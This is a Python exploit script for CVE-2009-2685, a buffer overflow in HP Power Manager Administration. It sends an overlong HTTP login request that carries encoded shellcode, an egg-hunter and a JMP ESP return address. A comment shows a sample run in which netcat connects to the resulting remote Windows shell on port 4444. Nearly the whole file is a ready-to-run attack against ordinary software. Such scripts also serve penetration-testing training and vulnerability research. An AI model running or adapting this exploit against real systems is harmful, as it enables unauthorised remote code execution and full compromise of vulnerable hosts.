#!/usr/bin/python
# HP Power Manager Administration Universal Buffer Overflow Exploit
# CVE 2009-2685
# Tested on Win2k3 Ent SP2 English, Win XP Sp2 English
# Matteo Memelli ryujin __A-T__ offensive-security.com
# www.offensive-security.com
# Spaghetti & Pwnsauce - 07/11/2009
#
# ryujin@bt:~$ ./hppowermanager.py 172.16.30.203
# HP Power Manager Administration Universal Buffer Overflow Exploit
# ryujin __A-T__ offensive-security.com
# [+] Sending evil buffer...
# HTTP/1.0 200 OK
# [+] Done!
# [*] Check your shell at 172.16.30.203:4444 , can take up to 1 min to spawn your shell
# ryujin@bt:~$ nc -v 172.16.30.203 4444
# 172.16.30.203: inverse host lookup failed: Unknown server error : Connection timed out
# (UNKNOWN) [172.16.30.203] 4444 (?) open
# Microsoft Windows [Version 5.2.3790]
# (C) Copyright 1985-2003 Microsoft Corp.

# C:\WINDOWS\system32>

import sys
from socket import *

print "HP Power Manager Administration Universal Buffer Overflow Exploit"
print "ryujin __A-T__ offensive-security.com"

try:
   HOST  = sys.argv[1]
except IndexError:
   print "Usage: %s HOST" % sys.argv[0]
   sys.exit()

PORT  = 80
RET   = "\xCF\xBC\x08\x76" # 7608BCCF JMP ESP MSVCP60.dll

# [*] Using Msf::Encoder::PexAlphaNum with final size of 709 bytes
# badchar = "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a"
SHELL = (
"n00bn00b"
"\x89\xe2\xdb\xc9\xd9\x72\xf4\x5f\x57\x59\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51"
"\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32"
"\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
"\x42\x75\x4a\x49\x69\x6c\x6a\x48\x4d\x52\x55\x50\x55\x50"
"\x35\x50\x53\x50\x6d\x59\x59\x75\x45\x61\x79\x50\x73\x54"
"\x6e\x6b\x76\x30\x44\x70\x4e\x6b\x76\x32\x64\x4c\x4e\x6b"
"\x52\x72\x66\x74\x6c\x4b\x44\x32\x47\x58\x44\x4f\x6d\x67"
"\x63\x7a\x74\x66\x36\x51\x4b\x4f\x4c\x6c\x55\x6c\x43\x51"
"\x71\x6c\x47\x72\x56\x4c\x75\x70\x6b\x71\x58\x4f\x56\x6d"
"\x35\x51\x6b\x77\x38\x62\x6c\x32\x32\x72\x62\x77\x6c\x4b"
"\x42\x72\x46\x70\x6e\x6b\x31\x5a\x55\x6c\x6c\x4b\x70\x4c"
"\x37\x61\x33\x48\x6a\x43\x47\x38\x35\x51\x58\x51\x42\x71"
"\x4c\x4b\x71\x49\x77\x50\x36\x61\x69\x43\x6e\x6b\x62\x69"
"\x35\x48\x7a\x43\x64\x7a\x47\x39\x6e\x6b\x76\x54\x4e\x6b"
"\x65\x51\x68\x56\x44\x71\x6b\x4f\x6c\x6c\x49\x51\x68\x4f"
"\x34\x4d\x56\x61\x4b\x77\x74\x78\x79\x70\x72\x55\x49\x66"
"\x64\x43\x63\x4d\x79\x68\x67\x4b\x43\x4d\x65\x74\x33\x45"
"\x6b\x54\x30\x58\x4c\x4b\x62\x78\x64\x64\x76\x61\x6e\x33"
"\x71\x76\x4e\x6b\x44\x4c\x70\x4b\x4e\x6b\x56\x38\x37\x6c"
"\x43\x31\x4b\x63\x4e\x6b\x74\x44\x6c\x4b\x63\x31\x68\x50"
"\x4d\x59\x61\x54\x66\x44\x55\x74\x33\x6b\x63\x6b\x65\x31"
"\x32\x79\x31\x4a\x50\x51\x49\x6f\x4d\x30\x43\x6f\x63\x6f"
"\x51\x4a\x6c\x4b\x45\x42\x58\x6b\x4c\x4d\x63\x6d\x32\x48"
"\x30\x33\x35\x62\x67\x70\x65\x50\x55\x38\x32\x57\x74\x33"
"\x50\x32\x61\x4f\x33\x64\x70\x68\x62\x6c\x61\x67\x67\x56"
"\x77\x77\x59\x6f\x68\x55\x6e\x58\x6c\x50\x45\x51\x77\x70"
"\x43\x30\x61\x39\x59\x54\x70\x54\x76\x30\x33\x58\x71\x39"
"\x4f\x70\x72\x4b\x75\x50\x49\x6f\x4e\x35\x30\x50\x36\x30"
"\x62\x70\x66\x30\x51\x50\x70\x50\x47\x30\x30\x50\x75\x38"
"\x6b\x5a\x46\x6f\x39\x4f\x4b\x50\x49\x6f\x6e\x35\x6a\x37"
"\x43\x5a\x34\x45\x55\x38\x6f\x30\x4c\x68\x76\x4d\x4d\x6d"
"\x50\x68\x55\x52\x63\x30\x77\x70\x52\x70\x4b\x39\x68\x66"
"\x53\x5a\x76\x70\x46\x36\x50\x57\x75\x38\x7a\x39\x4e\x45"
"\x74\x34\x31\x71\x69\x6f\x38\x55\x6b\x35\x4b\x70\x74\x34"
"\x66\x6c\x59\x6f\x72\x6e\x63\x38\x70\x75\x4a\x4c\x70\x68"
"\x4a\x50\x4f\x45\x39\x32\x36\x36\x59\x6f\x38\x55\x52\x48"
"\x51\x73\x70\x6d\x50\x64\x65\x50\x4c\x49\x78\x63\x63\x67"
"\x71\x47\x33\x67\x74\x71\x7a\x56\x33\x5a\x37\x62\x72\x79"
"\x72\x76\x39\x72\x6b\x4d\x61\x76\x59\x57\x43\x74\x64\x64"
"\x75\x6c\x63\x31\x63\x31\x6c\x4d\x73\x74\x35\x74\x44\x50"
"\x59\x56\x57\x70\x57\x34\x71\x44\x76\x30\x50\x56\x52\x76"
"\x50\x56\x61\x56\x61\x46\x52\x6e\x62\x76\x36\x36\x71\x43"
"\x70\x56\x51\x78\x50\x79\x38\x4c\x47\x4f\x6e\x66\x69\x6f"
"\x49\x45\x6d\x59\x59\x70\x32\x6e\x33\x66\x33\x76\x49\x6f"
"\x56\x50\x50\x68\x67\x78\x6f\x77\x35\x4d\x75\x30\x59\x6f"
"\x6e\x35\x4d\x6b\x4a\x50\x6d\x65\x6c\x62\x56\x36\x43\x58"
"\x59\x36\x5a\x35\x4f\x4d\x4f\x6d\x39\x6f\x5a\x75\x77\x4c"
"\x36\x66\x33\x4c\x46\x6a\x4f\x70\x6b\x4b\x4d\x30\x43\x45"
"\x47\x75\x6f\x4b\x63\x77\x37\x63\x73\x42\x30\x6f\x32\x4a"
"\x65\x50\x63\x63\x59\x6f\x78\x55\x41\x41")

EH ='\x33\xD2\x90\x90\x90\x42\x52\x6a'
EH +='\x02\x58\xcd\x2e\x3c\x05\x5a\x74'
EH +='\xf4\xb8\x6e\x30\x30\x62\x8b\xfa'
EH +='\xaf\x75\xea\xaf\x75\xe7\xff\xe7'

evil =  "POST http://%s/goform/formLogin HTTP/1.1\r\n"
evil += "Host: %s\r\n"
evil += "User-Agent: %s\r\n"
evil += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
evil += "Accept-Language: en-us,en;q=0.5\r\n"
evil += "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
evil += "Keep-Alive: 300\r\n"
evil += "Proxy-Connection: keep-alive\r\n"
evil += "Referer: http://%s/index.asp\r\n"
evil += "Content-Type: application/x-www-form-urlencoded\r\n"
evil += "Content-Length: 678\r\n\r\n"
evil += "HtmlOnly=true&Password=admin&loginButton=Submit+Login&Login=admin"
evil += "\x41"*256 + RET + "\x90"*32 + EH + "\x42"*287 + "\x0d\x0a"
evil = evil % (HOST,HOST,SHELL,HOST)

s = socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))
print '[+] Sending evil buffer...'
s.send(evil)
print s.recv(1024)
print "[+] Done!"
print "[*] Check your shell at %s:4444 , can take up to 1 min to spawn your shell" % HOST
s.close()